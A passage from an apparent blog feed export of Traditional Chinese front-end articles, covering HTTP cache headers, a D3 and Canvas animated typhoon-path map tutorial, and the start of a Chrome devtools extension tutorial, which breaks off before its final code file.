那如果我們要更新的話怎麼辦呢？我們不要更新這個檔案，直接更新index.html，換一個 JavaScript 檔案：
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;link rel=&#x27;stylesheet&#x27; href=&#x27;style.css&#x27;&gt;&lt;/link&gt;  &lt;script src=&#x27;script-8953jief32.js&#x27;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- body 為空，所有內容都交給 js 去 render --&gt;&lt;/body&gt;&lt;/html&gt;

因為index.html的快取策略是no-cache，所以每一次訪問這個頁面，都會去看index.html是否更新。
以現在這個例子來說，它的確更新了，因此新的這份就會傳回給瀏覽器。而瀏覽器發現有新的 JavaScript 檔案就會去下載並且快取起來。
藉由把 Etag 的機制實作在index.html裡面，我們就達成了我們的目標：「只要檔案不更新，瀏覽器就不會發 Request，直接沿用快取裡的即可。只要檔案一更新，瀏覽器就要立即抓取新的檔案」
原理就是針對不同的檔案採用不同的快取策略，並且直接用「更換 JavaScript 檔案」的方式強制瀏覽器重新下載。
這邊也可以參考 Google 提供的圖片：

（來源：https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-tw）
總結之所以快取的機制會有點小複雜，是因為分成不同的部分，每一個相關的 Header 其實都是在負責不同的部分。例如說Expires跟max-age是在負責看這個快取是不是「新鮮」，Last-Modified, If-Modified-Since, Etag, If-None-Match是負責詢問這個快取能不能「繼續使用」，而no-cache與no-store則是代表到底要不要使用快取，以及應該如何使用。
這篇文章其實只講到快取機制的一半，沒有提到的部分大致上都跟 shared cache 以及 proxy server 有關，有其他的值是在決定快取能不能被存在 proxy server 上？或者是驗證能否繼續使用的時候應該要跟原 server 驗證，還是跟 proxy server 驗證也可以。有興趣想要知道更多的讀者們可以參考底下的參考資料。
最後，希望這篇文章能讓初學者更理解 HTTP 的快取機制。
參考資料
彻底弄懂 Http 缓存机制 - 基于缓存策略三要素分解法
浅谈浏览器http的缓存机制
使用 HTTP 缓存：Etag, Last-Modified 与 Cache-Control
【Web缓存机制系列】1 – Web缓存的作用与类型
HTTP缓存控制小结
MDN - Cache-Control
rfc2616
Google Web Fundamentals
HTTP 1.0 spec

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>cache</tag>
        <tag>http header</tag>
      </tags>
  </entry>
  <entry>
    <title>D3v4 &amp; Canvas 工作坊 - D3 + Canvas 繪製動態路線圖</title>
    <url>/2017/08/26/canvas-path-map/</url>
    <content><![CDATA[前言HTML 5 的 Canvas 是許多人做動畫、做遊戲常常會用到的工具，此外，如果是進行資料視覺化，在繪製大量的圖形與動畫時，Canvas 可以為你的 performance 帶來很大的改善，從 D3.js 實戰 － Canvas 把我的視覺化變「快」了！ 中最後的範例就可以看得出來差異。
總之，身為前端工程師的我卻沒有實作做過 Canvas 相關應用，在羞愧之餘也得奮發向上扳回劣勢才可以，所以決定把上次用 d3 與 svg 繪製的颱風路徑圖重新用 Canvas 重寫一遍，也透過這篇文章做個紀錄。
Canvas 基礎概念 - 繪圖Canvas 顧名思義就是一塊畫布，只不過是生存在你的 HTML DOM tree 中，讓你透過 Javascript 在上面揮灑創意。
Canvas 就像一般的 DOM 元素一樣，有 width 與 height 等屬性可以設定，也能透過 CSS 來操作他的樣式，而這些樣式並不會影響到你在上面所進行的任何繪製功能。不過要注意一下，如果你是透過 CSS 去更改寬度與高度，他會放大 Canvas 元素本身，而不會放大 Canvas 內的像素，因此你在 Canvas 內繪製的圖形可能會變形。
&lt;canvas id=&quot;worldMapCanvas&quot; width=&quot;1000&quot; height=&quot;600&quot;&gt; Your browser is too old... &lt;/canvas&gt;
有了 Canvas 元素後，我們要取得他的 渲染環境（rendering context），之後必須要透過這個 Context 才能進行繪圖：
var canvas = document.getElementById(&#x27;worldMapCanvas&#x27;);var ctx = canvas.getContext(&#x27;2d&#x27;);

接下來的一切繪圖操作就會跟著你取得的 context 進行，透過一連串 Canvas API，你可以繪製出如下的圖案：
See the Pen First demo - define graph by Arvin (@arvin0731) on CodePen.


在 ball.draw() 這個函數當中，我用了五個最基本的 Canvas API 來進行繪製：
ctx.beginPath();ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2, true);ctx.closePath();ctx.fillStyle = this.color;ctx.fill();


ctx.beginPath():  MDN 上的說明是：產生一個新路徑，產生後再使用繪圖指令來設定路徑。  白話一點就是告訴 Canvas 說你現在要開始繪製線段了喔！請幫我開啟一個新的次路徑清單（sub-path），幫忙紀錄接下來我繪製的路線。  基本上在你每次繪製新的圖形或線段的時候，都需要呼叫一次 beginPath()，否則 Canvas 會將你先前的繪製的部分與後續你想繪製的新圖型當作同一個連續的圖。  來個範例（沒有使用 beginPath() 就直接想繪製新圖形時）：
  See the Pen First demo - beginPath by Arvin (@arvin0731) on CodePen.



可以發現我明明在 `lineTo()` 後有設定不同的 `strokeStyle`，但最後都被 &lt;span style=&quot;color:#B90CB3&quot;&gt;#B90CB3&lt;/span&gt; 給取代了，這就是因為沒有呼叫 beginPath 來對線段做區隔。

加上 `beginPath()` 後，結果就會是我們想要的了：
&lt;p data-height=&quot;300&quot; data-theme-id=&quot;29194&quot; data-slug-hash=&quot;ayqRMG&quot; data-default-tab=&quot;js,result&quot; data-user=&quot;arvin0731&quot; data-embed-version=&quot;2&quot; data-pen-title=&quot;First demo - addBeginPath&quot; class=&quot;codepen&quot;&gt;See the Pen &lt;a href=&quot;https://codepen.io/arvin0731/pen/ayqRMG/&quot;&gt;First demo - addBeginPath&lt;/a&gt; by Arvin (&lt;a href=&quot;https://codepen.io/arvin0731&quot;&gt;@arvin0731&lt;/a&gt;) on &lt;a href=&quot;https://codepen.io&quot;&gt;CodePen&lt;/a&gt;.&lt;/p&gt;





ctx.arc(x,y,raidus,startAngle,endAngle,counterclockwise):  就是畫出一個弧線，前兩個參數設定中心點的位置，接著設定半徑、起始點（起始角度）、結束點（結束角度）與方向（順時針或逆時針：
  

ctx.beginPath() 的範例中還有用到 moveTo(), lineTo() 與 stroke()，也都是很常用的 API，但從字面上就很好理解:

moveTo(x, y): 移動畫筆到 point x,y
lineTo(x, y): 從現在畫筆位置畫一條直線到 point x,y（但光呼叫 lineTo() 還不會畫出線段，需透過 stroke() 等相似 API）
stroke(): 實際下筆繪畫的 API


ctx.closePath():  closePath 其實在這邊不需要，他主要用途是在於幫你把你在 beginPath 後創建的 sub-path 做連接的動作，像是把第一條 path 的頭與最後一條 path 的尾巴接起來，但你也可以自己再多畫一條線將區域圍起來，只是稍嫌麻煩。  從字面上來看，closePath() 很像是呼叫後就能幫你斷開路徑的連續性，保持後續繪製圖型的獨立性，但實際上沒有這個功用，你需要透過 beginPath() 來完成。


還有很多 canvas API 的介紹都可以在 MDN 上查詢到，有的教學附有中文呦！MDN Canvas tutorial
Canvas 基礎概念 - 動畫先前利用 D3 與 svg 做動畫時，是使用 d3.timer 來控制時間，並且更改 svg 元素的 attribute 來移動物件，進而達到動畫效果，但是在 Canvas 的世界中，沒有移動的這種概念，你如果想要讓一個在 Canvas 上的物件移動，你需要的是重新繪製在不同位置的物件，在快速的 frame update 下，人眼看到的就會是一連串動畫了。這原理就跟一般的影片與動畫相同，都是透過每一次 frame 的更新，來呈現出連續畫面。
那要如何不斷地去更新 Canvas 呢？你可以透過 setInterval 也能夠用現在較為人知的 requestAnimationFrame 來處理，使用 setInterval 你可以直接控制動畫的更新速率，然而在效能上還是採用 requestAnimationFrame 較好，是以網頁頁面的更新速度為基準。
一個採用 requestAnimationFrame 的簡單動畫如下：
See the Pen First demo by Arvin (@arvin0731) on CodePen.


drawctx.clearRect(0,0, canvas.width, canvas.height);ball.draw();// ... calculate positionraf = window.requestAnimationFrame(draw);

關鍵只有兩個地方：

在每次 requestAnimationFrame 執行時，你都要清空現在的 Canvas 畫面重新繪製 ctx.clearRect(0,0, canvas.width, canvas.height);。
requestAnimationFrame 是必須自己去呼叫的，所以在我們的 draw() 函式中，最後要自己呼叫 raf 來重新 trigger 自己的 draw function。  你可以像一般的 setInterval 一樣記錄他回傳的 reference，並在適當時間 cancelAnimationFrame。

瞭解了 Canvas 的基礎知識後，可以開始動手今天的主題了！由於範例是修改自 D3v4 工作坊 - React + D3 繪製 svg 動態路線地圖，所以關於資料的取得與格式請參考該篇或是下面 Demo 的程式碼。
地圖在上一篇 D3v4 工作坊 - React + D3 繪製 svg 動態路線地圖 中，我們利用 svg path 元素搭配 d3.geoPath() 與 d3.geo 中的 geoMercator() 來繪製世界地圖，那 d3 有辦法幫助我們在 Canvas 上繪製世界圖嗎?
當然可以！
d3.geoPath() 有提供一個 context() API，讓你綁定 Canvas 的 context，然後就能傳入路徑資料繪製到 Canvas 上頭：
renderMapfunction renderMap() &#123;  const self = this;  const canvasNode = d3Select(&#x27;#mapCanvas&#x27;).node();  const context = canvasNode.getContext(&#x27;2d&#x27;);  // 傳入 canvas context 給 geoPath()  const path = geoPath().context(context);  context.beginPath();  // 記得一樣要放入你的映射函數  path.projection(this.projection());  this.state.worlddata.features.forEach((d, i) =&gt; &#123;      context.fillStyle =         &#x27;rgba(38,50,56,&#x27;+ 1 / this.state.worlddata.features.length * i + &#x27;)&#x27;      context.beginPath();      // 綁定 Canvas context 的 path 就能將傳入的資料繪製在 Canvas 上頭      path(d);      context.fill();  &#125;);  // add graticules path  context.beginPath();  path.projection(this.projection());  path(this.state.graticule);  context.fillStyle = &#x27;none&#x27;;  context.strokeStyle = &#x27;#79A09E&#x27;;  context.stroke();  &#125;

Demo: （可以切換模式看 code，或是到上一篇看，有許多重複的運算函式）


路徑接著重頭戲是要畫上路徑，這邊會複雜許多，我盡力說明，但直接看 code 會清楚一點。
這邊說明在 Canvas 上繪製動態路線的原理與步驟：
線段動畫原理：
跟 svg 要製作動態路線一樣的原理，我們都是先將線畫好後，利用線段的 **line dash** 與 **dash offset** 來製作出路徑的動畫效果。（可參考 [上一篇](http://blog.techbridge.cc/2017/07/21/d3-workshop-map/)）


因此在繪製上的步驟也差不多，只是實作的細節不同罷了：

Step 1. 繪製線段的入口點：

既然一樣是利用 line dash 與 dash offset，那我們也就需要取得路徑的長度，才能夠設定 lineDash 麻，但是你如果在前面的範例中有打開過 devTool，就知道根本看不到 Canvas 上面你繪製的物件，每個線段也都是用各點的 x, y 值去連接，這樣要怎麼知道整個線段長呢？！
難道要每一段每一段的線長度加總起來嗎？或許是個方法，但太麻煩了！
我們可以直接利用 D3 創建一個 invisiablePath，然後透過 getTotalLength() 來取得線段長度，並利用在 Canvas 上頭！
renderLine() 是一切的起點，我們在這邊創建隱藏的 svg path 好計算長度，並呼叫 requestAnimationFrame 進行 loop，傳入 updateLine 函式來產生動畫。
renderLine(canvasCtx, typhoonPath, marker, typhoonId) &#123;    const pathCoordinates = [];    typhoonPath.forEach((path) =&gt; &#123;        pathCoordinates.push(&#123;            x: this.projection()(path.coordinates)[0],            y: this.projection()(path.coordinates)[1],        &#125;);    &#125;);    const lineFunction = d3Line()      .x((d) =&gt; d.x)      .y((d) =&gt; d.y)      .curve(curveCatmullRom);    // use svg path to get length    const invisiblePath = d3Select(&#x27;svg&#x27;)      .append(&#x27;g&#x27;)      .append(&#x27;path&#x27;)      .attr(&#x27;d&#x27;, lineFunction(pathCoordinates))      .attr(&#x27;fill&#x27;, &#x27;none&#x27;)      .attr(&#x27;stroke&#x27;, &#x27;none&#x27;)      .attr(&#x27;class&#x27;, &#x27;invisiblePath&#x27;);    this.invisibleSVGPath[typhoonId] = invisiblePath.node();    const length = this.invisibleSVGPath[typhoonId].getTotalLength();    // this clears itself once the line is drawn    this.lineInterval[typhoonId] = requestAnimationFrame(this.updateLine.bind(this, canvasCtx, typhoonPath, length, marker, typhoonId));  &#125;


Step 3. 更新線段的函式：

在每一次 requestAnimationFrame trigger 的時候，我們都會呼叫 updateLine() 來重新 render canvas，主要進行幾個步驟：

defineLine()，定義線段，每一次的 loop 都需要重新繪製線段。 跳至 Step 4 看詳細實作

計算目前 progress，也就是目前 line offset 要調整到何處，我們是定義一個變數 this.speed 與 this.dir 來控制線段繪製的方向與速度。每一次的 loop 都會增加 this.progress 的值，然後丟入 this.moveDash() 中來繪製線段的 line dash 與 line dash offset。 跳至 Step 5 看詳細實作

最後，每一次呼叫 updateLine 時，我們都會檢查 this.progress 是否已經與線段長度相同，代表已經走完一次路線，需要重新開始，這時候我們就需要先將 canvas 清空：canvasCtx.clearRect(0,0,1000,600)，表示將 canvasCtx 所持有的渲染環境從位置 (0,0) 開始對寬 1000 與高 600 的 canvas 清空。最後可以利用 setTimoue() 來延長一下路徑走完後的時間，讓他不要馬上就清空 canvas 重繪。


updateLineupdateLine(canvasCtx, typhoonPath, length, marker, typhoonId) &#123;    // define the line    this.defineLine(canvasCtx, typhoonPath, marker, typhoonId);    this.progress[typhoonId] = this.progress[typhoonId] || 0;    if (this.progress[typhoonId] &lt; length) &#123;      this.progress[typhoonId] += this.speed;      this.moveDash(canvasCtx, typhoonId, typhoonPath, length, marker, this.progress[typhoonId], this.dir);      requestAnimationFrame(this.updateLine.bind(this, canvasCtx, typhoonPath, length, marker, typhoonId));    &#125; else &#123;          canvasCtx.clearRect(0, 0, 1000, 600);      this.progress[typhoonId] = 0;      setTimeout(() =&gt; requestAnimationFrame(this.updateLine.bind(this, canvasCtx, typhoonPath, 500, marker, typhoonId)), 1000);    &#125;  &#125;


Step 4. 定義線段的函式：

defineLinedefineLine(canvasCtx, typhoonPath, marker, typhoonId) &#123;  // define path  canvasCtx.beginPath();  // start point  const startPoint = &#123;    x: this.projection()(marker.coordinates)[0],    y: this.projection()(marker.coordinates)[1],  &#125;;  // 移動畫筆到起始點  canvasCtx.moveTo(startPoint.x, startPoint.y);  // 將路徑中的每個點與點之間用 lineTo() 連接起來  typhoonPath.forEach((path) =&gt; &#123;      const x = this.projection()(path.coordinates)[0];      const y = this.projection()(path.coordinates)[1];      canvasCtx.lineTo(x, y);  &#125;);  // 設定 style  canvasCtx.lineWidth = 2;  canvasCtx.strokeStyle = &#x27;rgba(53, 247, 14,0.7)&#x27;;&#125;


Step 5. 實作更新 LineDash 的函式：

單純的 moveDash 很簡單，只要透過 setLineDash()，將線段長度傳入，定義好你的 line dash 要多長，接著我們利用 Step 3 中提到的 this.speed 與 this.dir 來計算出現在要將 lineDashOffset 設為多少。
這邊有個有趣的 API，globalCompositeOperation，它可以用來決定你目前的 canvas context 渲染環境中，每個新繪製的物件與其他舊有的物件之間的階層關係，像是我這邊設置的 destination-over 就代表 新繪製的圖形會被壓在舊的圖形下方，至於為什麼我這邊要設置這個參數呢？待會介紹颱風圈實作時你就知道了！更多關於 globalCompositionOperation 的介紹可以看 MDN globalCompositeOperation
moveDashmoveDash = (canvasCtx, typhoonId, typhoonPath, length, marker, frac, dir = -1) =&gt; &#123;  // default direction right-&gt;left  // 設定 line dash 為線段長  canvasCtx.setLineDash([length]);  // 利用 `this.progress (frac)` 來慢慢增加 line-dash offset，製作出線段動態  canvasCtx.lineDashOffset = dir * (frac + length);  canvasCtx.globalCompositeOperation = &#x27;destination-over&#x27;;  canvasCtx.stroke();&#125;

到這裡為止，你已經創建出與上次相同的動態路線地圖，只是是採用 Canvas 實作，Demo：


暴風圈當然不能單純只有線段，還是需要有個跟著線段跑的颱風才比較有 fu。
你可以會想說，那就每次 moveDash() 執行的時候，順便也繪製上一個圓形的暴風圈不就好了嗎？
接著就這麼做了：
moveDashmoveDash = (canvasCtx, typhoonId, typhoonPath, length, marker, frac, dir = -1) =&gt; &#123;  // default direction right-&gt;left  /* 原本繪製線段的部分 ... */  // ...  // ..  // Move typhoon marker  canvasCtx.beginPath();  canvasCtx.setLineDash([0]);  canvasCtx.lineDashOffset = 0;  canvasCtx.lineWidth = 1;  canvasCtx.strokeStyle = &#x27;rgba(53, 247, 14,0.8)&#x27;;  canvasCtx.arc(p.x, p.y, 10, 0, Math.PI * 2, true);  canvasCtx.closePath();  canvasCtx.stroke();&#125;

然後就看到下面這個悲劇：


其實也沒有錯，你的確是畫上圈圈了，但是每一次的 moveDash() 都會畫上一個圈圈，並且會持續留在 Canvas 上，而實際上我們應該每一步都要將前一個圈圈刪除。
但如果你在這邊加上 canvasCtx.clearRect(0, 0, 1000, 600);，就會發現圈圈會正常移動了，但線段不見了…因為 moveDash() 並沒有重新繪製線段，只有更改 context 的 line dash。

解法那就多畫一層 Canvas 吧！
沒有人說過 Canvas 只能有一層，你可以疊加一層 Canvas 上去，讓跟著線段移動的暴風圈獨自一個圖層，這樣一來就不會互相影響了！
moveDash-multilayermoveDash = (canvasCtx, canvasTyphoonMarkerCtx, typhoonId, typhoonPath, length, marker, frac, dir = -1) =&gt; &#123;  // default direction right-&gt;left  canvasCtx.setLineDash([length]);  canvasCtx.lineDashOffset = dir * (frac + length);  canvasCtx.globalCompositeOperation = &#x27;destination-over&#x27;;  canvasCtx.stroke();  const p = this.invisibleSVGPath[typhoonId].getPointAtLength(frac);  canvasCtx.save();  // Move typhoon marker  canvasTyphoonMarkerCtx.clearRect(0, 0, 1000, 600);  canvasTyphoonMarkerCtx.beginPath();  canvasTyphoonMarkerCtx.setLineDash([0]);  canvasTyphoonMarkerCtx.lineDashOffset = 0;  canvasTyphoonMarkerCtx.lineWidth = 1;  canvasTyphoonMarkerCtx.strokeStyle = &#x27;rgba(53, 247, 14,0.8)&#x27;;  canvasTyphoonMarkerCtx.arc(p.x, p.y, 10, 0, Math.PI * 2, true);  canvasTyphoonMarkerCtx.closePath();  canvasTyphoonMarkerCtx.stroke();&#125;

const p = this.invisibleSVGPath[typhoonId].getPointAtLength(frac); 這邊我們先前創立的 invisibleSVGPath 又登場了，用來取得目前的線段點資料。
Demo: 利用兩層 Canvas 來實作跟著線段移動的暴風圈：


最後 Demo - 加上時間判斷、顏色區別、多個颱風的情況：

這邊還要注意一下，稍早提到的 globalCompositeOperation，如果你設為 source-over，也就是新繪製出的物件蓋在舊的上面的話，你就會發現颱風圈都被壓在線段下了！

因為在 moveDash 中，線段是一直在重新繪製的，而你留下的颱風圈相對就是舊的物件，所以記得要改成 destinatioin-over 才能有比較好的效果！
根據時間留下暴風圈這實作方法很簡單，就是在 moveDash 中判斷該點的時間，若符合要求就繪製上一個圖案即可，有興趣的讀者可以直接從 code 中看到。
如何讓所有動畫都結束後才一起重播？在我最後一個 Demo 中，一個颱風的路徑較短，一個較長，但卻能同時重播，我採用的方法其實蠻愚蠢的，暫時還沒想到更好的解法，歡迎大家提供。
我的方法是，用一個共有變數 this.allDone 來記錄每條路徑是否已經播完動畫（走完整條 path），接著在 updateLine() 中，當自己跑完 path 時，就會多檢查一下 this.allDone 中的結果，如果還有人在跑，那自己就繼續呼叫 requestAnimationFrame，但不將 Canvas 清空，所以會一直 loop 檢查 this.allDone，直到大家都跑完才清空 Canvas 並重新 loop。
updateLine-multipleif (this.progress[typhoonId] &lt; length) &#123;   // 正常執行 defineLine 與 moveDash&#125; else &#123;  // 不斷檢查是否每條 path 都跑完了  this.allDone[typhoonId] = true;  let keepWaiting;  Object.keys(this.allDone).forEach((allDoneTyphoonId) =&gt; &#123;    if (!this.allDone[allDoneTyphoonId]) &#123;        keepWaiting = true;    &#125;    return keepWaiting;  &#125;);  if (keepWaiting) &#123;    requestAnimationFrame(this.updateLine.bind(this, canvasCtx, canvasTyphoonMarkerCtx, typhoonPath, 500, marker, typhoonId));  &#125; else &#123;    // 清空 canvas 並重新 loop  &#125;&#125;

結論利用 Canvas 繪製動畫實際上比用 D3 + svg 煩瑣多了，但是當你的動畫有大量的物件時，Canvas 能為你帶來大幅的 performance 改進，畢竟 svg 的操作會直接影響到 DOM tree。另外，實際上要將這些東西應用到 Production 的話，其實還有非常多細節要調整，包含各種 Browser 與 Device 的呈現、Map Scale 的彈性等等，還有很長的路要走啊…這篇文章算是我的一個筆記，寫得有點雜亂，歡迎（有看完的或是看不下去的）讀者給予任何建議！(PS. 我本來路徑跟暴風圈的顏色是想弄得像 EVA 風格，結果有點慘XD  但我懶得修了就給大家笑笑～)
資料來源
How SVG Line Animation Works
D3.js 實戰 － Canvas 把我的視覺化變「快」了！
MDN Canvas tutorial
MDN globalCompositeOperation
mbostock d3.geoPath + Canvas

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>d3</tag>
        <tag>canvas</tag>
        <tag>map</tag>
        <tag>animation</tag>
        <tag>d3.js</tag>
      </tags>
  </entry>
  <entry>
    <title>Chrome devtools extension 實作介紹</title>
    <url>/2018/02/10/chrome-devtool-extension/</url>
    <content><![CDATA[前言身為工程師，想辦法提高自己的工作效率是一件很重要的事情，畢竟這樣才有多餘的時間打電動，除了平時加強各種知識與累積經驗外，撰寫工具的能力也值得培養。剛好在前不久，公司舉辦了一次內部的 hackday，我就利用這個時間針對公司內部的 framework 寫了一個簡單的 chrome devtools 的 extension，增加開發上的便利性。而在開發的過程中，發現關於 Chrome devtools extension 的文章並不是很多，中文的更少。總之，雖然官方文件該有的都有，但跟 vscode extension 的文件比起來就是差了很多，光是排版就讓人不太想閱讀…因此希望藉此篇文章介紹開發 chrome devtools extension 的方法與一些注意事項。（註：可能需要先有點 Chrome extension 的相關知識會比較好懂）
先給大家看其中一個範例（共有兩個），主要是能自動將 DOM 物件的 element inline style 轉化為 Atomic CSS 的 class 名稱（不知道 Atomic CSS 的可以看這篇），如此一來，在 Inspector 中調整完 style 後，就能直接將轉換好的 Atomic CSS 複製貼上到 code 當中，省去一次自己轉換的時間（有時還會忘記 class name…）

Chrome devtools extension 基本介紹有開發過 Chrome extension 的人應該都知道，我們會有所謂的 Content Script 與 Background page 兩種不同的 context 存在於我們的 extension 中，而 Devtools page 也是一個獨立的 context，從下面這張官方圖可以很清楚的看到其之間的差異：


Content Script: 可以存取實際頁面的 DOM 物件與事件。
Background page: 可以調用多數 extension API，像是 chrome.runtime.* 與 chrome.tabs.onUpdated，並負責 extension 與 Content script、Devtools page 之間的溝通。
Devtools page: 可以調用 chrome.extensions.* 與 chrome.devtools.* Devtools API，其他的就都無法存取。可以透過 chrome.devtools.inspectedWindow.eval 能與目前開啟 inspector 的頁面互動。

與一般 Extension 不同的地方就在於多了 Devtools API 需要了解，而主要的 Devtools API 其實也只有三種：
1. chrome.devtools.inspectedWindow透過 inspectedWindow.eval 可以在當前開啟 inspector 的頁面 context 執行 javascript：
chrome.devtools.inspectedWindow.eval(  &quot;window.$0.style.cssText&quot;,  function callback(result, Error) &#123;    // result 為 window.$0.style.cssText    // 在當前頁面的 context 下支執行結果 &#125;);
2. chrome.devtools.networknetwork api 可以取得你在 Network panel 看到的資訊。
// 取得當前開啟 inspector 的頁面所發出的 request 中，bodySize &gt; 40*1024 的 urlchrome.devtools.network.onRequestFinished.addListener(      function(request) &#123;        if (request.response.bodySize &gt; 40*1024) &#123;          chrome.devtools.inspectedWindow.eval(              &#x27;console.log(&quot;Large request: &quot; + unescape(&quot;&#x27; +              escape(request.request.url) + &#x27;&quot;))&#x27;);        &#125;  &#125;);
3. chrome.devtools.panelspanels api 應該是最重要的一塊了，因為我們必須透過它來創建 Panel 或 Sidebar。

Chrome devtools 的 extension UI 基本上就是分為上面這兩種類型，與上方 Elements、Network 和 Sources 同 Level 的稱為 Panel，而在每個 Panel 底下還可以另外創建 Sidebar，像是 Elements panel 右邊的 style sidebar。
chrome.devtools.panels.create(&quot;Simple Panel&quot;,  &quot;logo.png&quot;,  &quot;Panel.html&quot;,  function (panel) &#123;    // code invoked on panel creation  &#125;);

看完這些 API 應該也是一頭霧水，也不清楚到底要在哪裡呼叫，別急，接下來會針對這兩種 UI 個別實作一個範例來說明。
Chrome devtools extension - Sidebar 實作開頭的範例中，就是採取 Sidebar 的 UI，屬於 ElementPanel 底下的 sidebar。
接著先看一下我們的檔案結構：


很簡單，重點只有三個檔案，ruleMap.js 是跟 Atomic CSS 相關的 mapping 檔案，這邊不需要理會：
1. manifest.json  &#123;  &quot;name&quot;: &quot;Atomic CSS Devtool&quot;,  &quot;version&quot;: &quot;0.1&quot;,  &quot;description&quot;: &quot;devtool extension for making Acss users happier&quot;,  &quot;devtools_page&quot;: &quot;devtools.html&quot;,  &quot;manifest_version&quot;: 2&#125;
  跟一般 extension 一樣，要在 manifest.json 中做相對應設定，既然是開發 Devtools extension，自然就要註冊 devtools_page，指定為 devtools.html，這份 html 就是用來載入相關 js 的入口頁面。
2. devtools.html  &lt;html&gt;  &lt;body&gt;    &lt;script src=&quot;ruleMap.js&quot;&gt;&lt;/script&gt;    &lt;script src=&quot;devtools.js&quot;&gt;&lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;
  內容非常簡單，載入整個 devtools extension 需要的 javascript 檔案。如果你在 devtools.js 中有其他需要使用的 lib，也請記得在這個地方進行載入，像是 lodash 等等。  但若你要載入非本地端的 javascript（透過 cdn 之類），會遇到 CSP(content security policy) 的錯誤，在 注意事項 中我會再說明解法。
3. devtools.js  (function() &#123;  chrome.devtools.panels.elements.createSidebarPane(    &quot;acss class&quot;,    function (sidebar) &#123;      // The function below is executed in the context of the inspected page.      var page_generateAtomicClass = function (selectedElementCssText) &#123;        // generate Atomic CSS        // 略...        return styleMap;      &#125;      function updateElementProperties(acssClass) &#123;        sidebar.setObject(acssClass);      &#125;;      function getAcssClass() &#123;        chrome.devtools.inspectedWindow.eval(          &quot;window.$0.style.cssText&quot;,            function (result, isException) &#123;              const selectedElementCssText = result;              const acssClass = page_generateAtomicClass(selectedElementCssText);              updateElementProperties(acssClass);            &#125;        );      &#125;;      chrome.devtools.panels.        elements.onSelectionChanged.addListener(getAcssClass);      getAcssClass();  &#125;);&#125;)();

devtool.js 就比較複雜了，所有主要功能都發生在這裡。
首先，我們利用 chrome.devtools.panels.elements.createSidebarPane(sidebarTitle, callbackFunc) 來創建 Sidebar，在 callback 中我們會拿到一個 sidebar 物件，此物件是我們與右邊這個 sidebar 區塊互動的媒介，有四種 method 可以使用：

sidebar.setObject()  我們範例中就是使用 setObject() 來將運算完的資料（轉換後的 atomic css classname）傳到 sidebar 顯示，他會將傳入的 Object 展開：
  

sidebar.setPage() 與 sidebar.setHeight()  若是覺得光是顯示 JS 的 Object 太單調，你也可以利用 setPage() 搭配 setHeight() 來在 sidebar 中塞入一個 html。
  chrome.devtools.panels.elements.createSidebarPane(&quot;Atomic Css&quot;,    function(sidebar) &#123;      sidebar.setPage(&quot;Sidebar.html&quot;);      sidebar.setHeight(&quot;8ex&quot;);    &#125;);
  Sidebar.html 中，可以自由繪製畫面，但要注意的是，你是在 sidebar 的 context 中，不能取得當前頁面的 DOM 物件資料，需要的話得透過 background.js 以 postMessage 來傳遞，我們最後還會提到。

sidebar.setExpression()  除了 setObject 以外，我們也能夠過 setExpression 直接 eval() js code 到當前的 inspected page。
  sidebar.setExpression(&quot;(&quot; + page_generateAtomicClass.toString() + &quot;)()&quot;);
  使用方法有點特殊，因為是 eval 的方式，你需要把函式 toString() 後再傳入，此外，在傳入的 page_generateAtomicClass() 中，你可以取得當前 inspected 頁面的資訊！  例如：$0 (Chrome devtools 中特殊的變數，等同於 Element panel 中你目前選取的元素 DOM)。  官方文件中 setExpression 還能傳入一個 callback，但是我怎麼傳都會有 Error 就是了…


接著，我用 chrome.devtools.inspectedWindow.eval(&quot;window.$0.style.cssText&quot;, callback); 的方式去取得 selected element 的 css 資訊，接著在 callback 中將其傳給 page_generateAtomicClass() 做運算，最後用 sidebar.setObject() 將結果輸出。
等等，你不是說 sidebar.setExpression 就能直接取得 $0 了嗎？何必多此一舉？
原因很簡單，因為在 setExpression 傳入的 function 中，你取不到 devtools.js 中的 context，所有你在 devtools.html 中 include 的 js 都無法取得，像是我需要用來轉換 Atomic css 的 ruleMap.js 就無法拿到，只好採此作法。在實作時需要特別注意 context 的問題！
最後，我們註冊一個 onSelectionChanged 監聽事件 chrome.devtools.panels.elements.onSelectionChanged.addListener(getAcssClass);，只要選擇別的 elements 時就重新執行。
到這邊為止，你就能夠做出如同一開始範例所展現功能的 Devtools extension 了！
Chrome devtools extension - Panel 實作這個範例是實作 Panel UI 的 extension，這邊我將功能降之最低，單純抓出目前頁面的 Page title，目的在展示如何將不同 context 的資訊呈現在 Devtools 的 Panel 中。

一樣先來看檔案結構：


可以看到基本上跟前一個範例差不多，只是多了 Panel.html 與 background.js 兩個檔案。
另外的差別在於 devtools.js：
(function() &#123;  chrome.devtools.inspectedWindow.eval(    &quot;document.title&quot;,    function (result, isException) &#123;      if (!isException &amp;&amp; result) &#123;        chrome.devtools.panels.create(&quot;Panel Demo&quot;,          &quot;logo.png&quot;,          &quot;Panel.html&quot;,          function (panel) &#123;            // code invoked on panel creation          &#125;        );      &#125;    &#125;  );&#125;)();

有別於前一個範例我們都將程式邏輯寫在 devtools.js 中，這次我們只在這邊進行創建 panel 的程式，可以從上面程式碼中看到，我們創建了一個 Title 叫做 “Panel Demo” 的 panel，並告訴 chrome devtool 是要用 Panel.html 這份檔案。
在 Panel.html 中，我們載入主要程式邏輯 getPageTitle.js，你也可以看到，這邊就是繪製 Panel 的地方，因此可以載入 bootstrap 等 css style 來輔助。
&lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot; integrity=&quot;sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm&quot;    crossorigin=&quot;anonymous&quot;&gt;&lt;div id=&quot;app&quot; class=&quot;container mt-3&quot;&gt;&lt;/div&gt;&lt;script src=&quot;getPageTitle.js&quot;&gt;&lt;/script&gt;

接著來看主要程式邏輯，getPageTitle.js：
